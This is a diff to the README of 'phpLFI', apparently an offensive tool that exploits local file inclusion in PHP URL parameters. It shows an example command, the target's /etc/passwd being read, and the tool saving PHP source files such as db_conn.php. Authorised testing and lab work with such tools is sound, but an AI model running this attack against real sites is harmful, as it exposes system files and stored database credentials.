@@ -8,9 +8,8 @@ Give it at least one php file for the -f option. I recommend you run gobuster/ff
 Please note that this program is limited to discovering and exploiting LFI in PHP only, and only when a single '=' appears in the URL. I may add the ability to test/exploit multiple params at a later date, but feel free to contribute that feature if you need it and can't wait. :)
 
 ```
-$ ./phpLFI -u:'http://192.168.0.100/image.php?img=blah.jpg' -f:login.php,foo.php
-
-[!] LFI found in url. Successfully accessed /etc/passwd
+$ ./phpLFI -u:'http://10.1.1.100/image.php?img=foo.jpg' -f:login.php,image.php
+✓ LFI found in url. Successfully accessed /etc/passwd
 
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
@@ -42,24 +41,26 @@ landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
 pollinate:x:109:1::/var/cache/pollinate:/bin/false
 sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
 mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
-mike:x:1000:1000:mike:/home/mike:/bin/bash
+thomas:x:1000:1000:aaron:/home/aaron:/bin/bash
 
+ℹ Searching php files for includes...
 
-[i] Searching php files for includes...
-
-Discovered a file: header.php
-Discovered a file: db_conn.php
-Discovered a file: index.php
-Discovered a file: index.php
-Discovered a file: footer.php
-Checking file: login.php
-    Saving file: login.php
-Checking file: header.php
-    Saving file: header.php
-Checking file: db_conn.php
-    Saving file: db_conn.php
-Checking file: index.php
-    Saving file: index.php
-Checking file: footer.php
-    Saving file: footer.php
+✓ Discovered a file: header.php
+✓ Discovered a file: db_conn.php
+✓ Discovered a file: index.php
+✓ Discovered a file: index.php
+✓ Discovered a file: footer.php
+ℹ Checking file: login.php
+    ✓ Saving file: login.php
+ℹ Checking file: image.php
+    ✓ Saving file: image.php
+ℹ Checking file: header.php
+    ✓ Saving file: header.php
+ℹ Checking file: db_conn.php
+    ✓ Saving file: db_conn.php
+ℹ Checking file: index.php
+    ✓ Saving file: index.php
+ℹ Checking file: footer.php
+    ✓ Saving file: footer.php
+                                     
 ```
